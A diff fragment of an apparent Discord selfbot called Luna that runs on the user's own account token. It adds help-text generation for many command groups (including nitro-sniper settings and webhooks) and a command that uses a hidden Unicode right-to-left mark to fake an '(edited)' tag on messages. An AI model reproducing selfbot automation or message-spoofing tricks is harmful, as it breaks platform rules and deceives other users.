+            helptext += "\nHentai commands:\n"
+            commands = cog.get_commands()
+            for command in commands:
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
+            cog = self.bot.get_cog('Sniper settings')
+            helptext += "\nSniper settings:\n"
+            commands = cog.get_commands()
+            for command in commands:
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
+            cog = self.bot.get_cog('Theme commands')
+            helptext += "\nTheme commands:\n"
+            commands = cog.get_commands()
+            for command in commands:
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
+            cog = self.bot.get_cog('Toast customization')
+            helptext += "\nToast customization:\n"
+            commands = cog.get_commands()
+            for command in commands:
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
+            cog = self.bot.get_cog('Toast commands')
+            helptext += "\nToast commands:\n"
+            commands = cog.get_commands()
+            for command in commands:
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
+            cog = self.bot.get_cog('Webhook setup')
+            helptext += "\nWebhook setup:\n"
+            commands = cog.get_commands()
+            for command in commands:
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
+            cog = self.bot.get_cog('Webhook commands')
+            helptext += "\nWebhook commands:\n"
+            commands = cog.get_commands()
+            for command in commands:
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
+            cog = self.bot.get_cog('Webhook urls')
+            helptext += "\nWebhook urls:\n"
+            commands = cog.get_commands()
+            for command in commands:
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
+            cog = self.bot.get_cog('Webhook customisation')
+            helptext += "\nWebhook customisation:\n"
+            commands = cog.get_commands()
+            for command in commands:
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
+            cog = self.bot.get_cog('Miscellaneous commands')
+            helptext += "\nMiscellaneous commands:\n"
+            commands = cog.get_commands()
+            for command in commands:
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
+            cog = self.bot.get_cog('Game commands')
+            helptext += "\nGame commands:\n"
+            commands = cog.get_commands()
+            for command in commands:
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
+            # ///////////////////////////////////////////////////////////////////
 
             commandcount = len(self.bot.commands)
+            try:
+                custom = cog.get_commands()
+                custom_command_count = 0
+                for command in custom:
+                    custom_command_count += 1
+            except BaseException:
+                custom_command_count = 0
 
             file = open(os.path.join(files.documents(), "Luna/commands.txt"), "w")
-            file.write(f"{commandcount} Commands\n\n<> is required | [] is optional\n\n{helptext}")
+            file.write(f"{commandcount - custom_command_count} Commands\n\n<> is required | [] is optional\n\n{helptext}")
             file.close()
             await message_builder(luna, title="Text Help", description=f"```\nSaved all commands in Documents/Luna/commands.txt```")
         except Exception as e:
@@ -14757,7 +14875,7 @@ class MiscCog(commands.Cog, name="Miscellaneous commands"):
                     documents=True) == "on" and files.json(
                 "Luna/notifications/toasts.json",
                 "toasts",
-                    documents=True) == "on":
+                documents=True) == "on":
                 notify.toast(message=f"Starting update {version_url}")
             if files.json(
                     "Luna/webhooks/webhooks.json",
@@ -14765,7 +14883,7 @@ class MiscCog(commands.Cog, name="Miscellaneous commands"):
                     documents=True) == "on" and files.json(
                 "Luna/webhooks/webhooks.json",
                 "webhooks",
-                    documents=True) == "on" and not webhook.login_url() == "webhook-url-here":
+                documents=True) == "on" and not webhook.login_url() == "webhook-url-here":
                 notify.webhook(url=webhook.login_url(), name="login",
                                description=f"Starting update {version_url}")
             await message_builder(luna, title="Update", description=f"```\nStarted update » {version_url}```")
@@ -15007,6 +15125,21 @@ class MiscCog(commands.Cog, name="Miscellaneous commands"):
             '\r\n')[1].strip('\r').strip()
         prints.message(f"Your HWID » {hwid}")
 
+    @commands.command(name="edited",
+                      usage="<message>",
+                      description="Add the \"edited\" tag to the message")
+    async def edited(self, luna, message: str):
+        await luna.message.delete()
+        MAGIC_CHAR = '\u202b'
+        headers = {'Authorization': user_token}
+        message_ = f'{MAGIC_CHAR} {message} {MAGIC_CHAR}'
+        res = requests.post(f'https://discordapp.com/api/{api_version}/channels/{luna.channel.id}/messages', headers=headers,
+                            json={'content': message_})
+        if res.status_code == 200:
+            message_id = res.json()['id']
+            requests.patch(f'https://discordapp.com/api/{api_version}/channels/{luna.channel.id}/messages/{message_id}',
+                           headers=headers, json={'content': ' ' + message_})
+
 
 bot.add_cog(MiscCog(bot))
 
@@ -15149,7 +15282,7 @@ async def mode_error(luna, modes: str):
     return sent
 
 
-async def message_builder(luna, title: str = None, description = "", large_image: str = None,
+async def message_builder(luna, title: str = None, description="", large_image: str = None,
                           delete_after: int = None, footer_extra: str = None, footer: str = None):
     """
     Luna's main function for creating messages with the theme applied.\n
